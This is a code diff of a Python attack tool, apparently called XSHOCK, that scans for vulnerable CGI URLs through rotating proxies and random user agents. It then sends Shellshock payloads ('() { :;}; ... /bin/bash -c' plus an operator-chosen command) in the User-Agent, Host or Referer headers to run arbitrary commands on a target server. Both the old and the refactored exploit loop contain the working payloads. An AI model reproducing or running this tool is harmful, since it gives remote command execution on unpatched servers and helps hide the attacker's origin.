@@ -4,7 +4,8 @@ import sys
 import random
 import loginscreen
 from time import sleep
-import proxy as prx
+import proxy
+
 
 class Colors:
     r = '\033[31m'
@@ -87,9 +88,9 @@ def dizinScan():
                         os.chdir(anadizin)
                         usrr = get_user_agent()
                         proy = get_proxies()
-                        proxy = {'https': 'http://{}'.format(random.choice(proy))}
+                        proxyy = {'https': 'http://{}'.format(random.choice(proy))}
                         headers_param = {"User-Agent": "{}".format(random.choice(usrr))}
-                        istek = requests.get(url, headers=headers_param, proxies=proxy)
+                        istek = requests.get(url, headers=headers_param, proxies=proxyy)
                         if (istek.status_code == 200) or (istek == 301) or (istek == 302):
                             print(Colors.y, "Status Code\t:" + str(istek.status_code))
                             print("[+]-----> Find Vuln Url\t: " + url)
@@ -110,94 +111,55 @@ def dizinScan():
         pass
     print("\n{} vulnerable url(s) found.Please check vulnurl.txt".format(counter))
     sleep(2)
-    counter = 0
+
+
 def commandIn():
     try:
+        print("e.g==>http://target.com/cgi-bin/status")
+        aaa = input(Colors.b + "Vulnerable url enter\t\t:")
+        komut = input("Please Command Enter:")
         while True:
-            aaa = input(Colors.b +"Vulnerable url enter\t\t:")
-            while True:
-                print(Colors.w + "[+]-----> Press '1' to enter new url..!")
-                print(Colors.w + "[+]-----> Press 'q' to exit..!")
-                command = input(Colors.r + "[+]-----> Please enter the command you want to run\t\t:")
-                if (command == "q"):
-                    print("Exiting...")
-                    sys.exit()
-                elif (command == "1"):
-                    commandIn()
-                else:
-                    x="""
-                    
-1) -----> SEND USER-AGENT PAYLOAD
-2) -----> SEND HOST PAYLOAD
-3) -----> SEND REFERER PAYLOAD
-                    
-                    """
-                    print(Colors.b,x)
-                    secim =input("Choose:")
-                    headers = {"User-Agent": "() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
-                    host = {"Host":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
-                    referer = {"Referer":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
-                    if(secim=="1"):
-                        req = requests.get(aaa, headers=headers)
-                        with open("response.txt", "a", encoding="utf-8") as f:
-                            f.writelines(
-                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
-                                    aaa))
-                            f.writelines(req.text)
-                            f.writelines(
-                                "\nEND | URL: {}\n========================================================\n".format(
-                                    aaa))
+            x = """                    
+1) -----> SEND PAYLOAD WITH USER-AGENT
+2) -----> SEND PAYLOAD WITH HOST
+3) -----> SEND PAYLOAD REFERER
+4) -----> WRITE NEW URL
+5) -----> EXIT
+                                """
+            print(Colors.y, x)
+            secim = input("Choose:")
+            header = {"User-Agent": "() { :;}; echo; echo; /bin/bash -c " + "'" + komut + "'"}
+            host = {"Host": "() { :;}; echo; echo; /bin/bash -c " + "'" + komut + "'"}
+            referer = {"Referer": "() { :;}; echo; echo; /bin/bash -c " + "'" + komut + "'"}
+            if secim == "1":
+                req = requests.get(aaa, headers=header)
+                print(req.text)
+            elif secim == "2":
+                req = requests.get(aaa, headers=host)
+                print(req.headers)
+            elif secim == "3":
+                req = requests.get(aaa, headers=referer)
+                print(req.headers)
+            elif secim == "4":
+                commandIn()
+            elif secim == "5":
+                sleep(1)
+                sys.exit(0)
 
-                        print("Result written in file...")
-                        with open("response.txt", "r", encoding="utf-8") as f:
-                            for i in f:
-                                print(i.replace("\n", ""))
-                    elif(secim=="2"):
-                        req = requests.get(aaa, headers=host)
-                        with open("response.txt", "a", encoding="utf-8") as f:
-                            f.writelines(
-                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
-                                    aaa))
-                            f.writelines(req.text)
-                            f.writelines(
-                                "\nEND | URL: {}\n========================================================\n".format(
-                                    aaa))
-
-                        print("Result written in file...")
-                        with open("response.txt", "r", encoding="utf-8") as f:
-                            for i in f:
-                                print(i.replace("\n", ""))
-                    elif(secim=="3"):
-                        req = requests.get(aaa, headers=referer)
-                        with open("response.txt", "a", encoding="utf-8") as f:
-                            f.writelines(
-                                "\n\n========================================================\nBEGIN | URL:{}\n\n".format(
-                                    aaa))
-                            f.writelines(req.text)
-                            f.writelines(
-                                "\nEND | URL: {}\n========================================================\n".format(
-                                    aaa))
-
-                        print("Result written in file...")
-                        with open("response.txt", "r", encoding="utf-8") as f:
-                            for i in f:
-                                print(i.replace("\n", ""))
-                    else:
-                        print("WRONG CHOOSE!!!")
+            else:
+                print("WRONG CHOOSE!!!")
 
     except Exception as err:
-       print(err)
-       sleep(5)
-       commandIn()
-
-
+        print(err)
+        sleep(5)
+        commandIn()
 
 
 loginscreen.entry()
 
 
 def Menu():
-    prx.proxy_lister()
+    proxy.proxy_lister()
     print(Colors.m, "\n\n|~~|~~|~~|         WELCOME TO XSHOCK            |~~|~~|~~|  ")
     y = """
 1) CGI VULN SCAN
@@ -228,7 +190,7 @@ Please update proxies from 5 first...
                 with open("vulnurl.txt", "r") as f:
                     print(f.read())
             elif secim == "5":
-                import proxy
+                proxy.proxy_lister()
             elif secim == "6":
                 print("Exiting...")
                 sleep(1)
